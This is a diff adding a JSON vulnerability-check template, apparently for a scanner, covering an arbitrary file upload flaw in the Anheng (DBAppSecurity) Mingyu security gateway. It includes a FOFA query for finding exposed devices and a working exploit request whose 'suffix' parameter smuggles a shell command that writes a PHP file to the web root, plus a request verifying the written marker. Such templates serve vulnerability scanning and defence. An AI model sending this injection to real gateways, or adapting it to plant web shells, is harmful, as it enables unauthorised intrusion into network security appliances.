@@ -1,0 +1,33 @@
+{
+  "product": "安恒信息明御安全网关",
+  "vul_name": "安恒信息明御安全网关任意文件上传",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "安恒明御安全网关是一个网络安全产品，由安恒信息技术股份有限公司开发和提供。它是一个综合性的安全管理平台，用于保护企业网络免受各种网络威胁的攻击。该产品存在文件上传漏洞。",
+  "version": "安恒信息明御安全网关",
+  "note": "",
+  "search": {
+    "FOFA": "title==\"明御安全网关\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_53003652/article/details/133879821",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&$type=1&suffix=1|echo \\\"95cc64dd2825f9df13ec4ad683ecf339\\\" > .52e039302a62d077.php"
+    },
+    "verify": {
+      "method": "get",
+      "path": "/webui/.52e039302a62d077.php",
+      "logic": "and",
+      "check": [
+        {
+          "body": "95cc64dd2825f9df13ec4ad683ecf339"
+        }
+      ]
+    }
+  }
+}
